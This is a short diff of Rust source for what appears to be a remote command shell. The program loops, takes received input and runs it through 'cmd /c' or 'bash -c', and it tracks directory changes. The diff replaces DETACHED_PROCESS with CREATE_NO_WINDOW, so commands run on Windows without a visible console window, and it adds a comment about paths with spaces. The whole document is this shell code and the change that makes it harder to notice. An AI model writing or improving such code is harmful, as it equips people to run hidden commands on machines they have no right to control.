@@ -15,7 +15,7 @@ const SHELL: [&str; 2] = ["cmd", "/c"];
 #[cfg(not(target_os = "windows"))]
 const SHELL: [&str; 2] = ["bash", "-c"];
 
-const DETACHED_PROCESS: u32 = 0x00000008;
+const CREATE_NO_WINDOW: u32 = 0x08000000;
 
 fn main() {
     loop {
@@ -37,9 +37,10 @@ fn main() {
                             let cmd = String::from_utf8_lossy(&input[0..input.len() - 1]);
 
                             #[cfg(target_os = "windows")]
-                            let _ = match Command::new(SHELL[0]).args(&[SHELL[1], &cmd]).creation_flags(DETACHED_PROCESS).output() {
+                            let _ = match Command::new(SHELL[0]).args(&[SHELL[1], &cmd]).creation_flags(CREATE_NO_WINDOW).output() {
                                 Ok(output) => {
                                     if cmd.starts_with("cd") {
+                                        // Buggy support for directories with whitespaces, so use dir /x to get Windows short names
                                         let _ = env::set_current_dir(
                                             cmd.split_whitespace().nth(1).expect(
                                                 "The system cannot find the path specified.",
